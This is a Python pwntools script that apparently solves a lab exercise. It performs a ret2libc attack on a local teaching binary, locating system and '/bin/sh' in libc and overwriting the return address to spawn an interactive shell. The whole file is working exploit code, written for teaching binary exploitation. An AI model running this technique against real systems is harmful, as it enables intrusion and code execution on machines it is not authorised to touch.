#!/usr/bin/env python3
"""Solution for Problem 1 (ret2libc): single system("/bin/sh") call.

NX blocks stack shellcode, so we reuse libc: overwrite the return address with
  [ &system ][ fake ret ][ &"/bin/sh" ]
and main's ret runs system("/bin/sh"). ASLR must be off (the VM default) so the
libc base is fixed.

Run:  cd example5 && make && python3 solution5/solve_ret2libc.py
"""
import os
import re
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))


def runnable(path):
    """/vagrant vboxsf flakily drops the +x bit; always run from an ext4 copy."""
    import shutil, tempfile
    dst = os.path.join(tempfile.mkdtemp(), os.path.basename(path))
    shutil.copy(path, dst)
    os.chmod(dst, 0o755)
    return dst


BIN = runnable(os.path.join(HERE, "..", "ret2libc"))


def loaded_libc(io):
    """Return an ELF of the running process's libc, with .address set."""
    for path, base in io.libs().items():
        if re.search(r"/libc(\.so|-|\.)", os.path.basename(path)) or "libc.so" in path:
            e = ELF(path, checksec=False)
            e.address = base
            return e
    raise RuntimeError("libc not found in process maps")


def find_offset():
    io = process(BIN)
    io.sendline(cyclic(200))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset(buf -> return address) = %d", off)
    return off


def main():
    offset = find_offset()

    io = process(BIN)
    io.recvuntil(b"overflow me:\n")              # prompt => libc is mapped
    libc = loaded_libc(io)                       # correct libc, base from maps
    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    log.info("system @ %#x   /bin/sh @ %#x", system, binsh)

    payload = flat(b"A" * offset, system, libc.symbols["exit"], binsh)
    io.sendline(payload)
    log.success("ret2libc -> system(\"/bin/sh\") -- dropping a shell")
    io.sendline(b"id; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
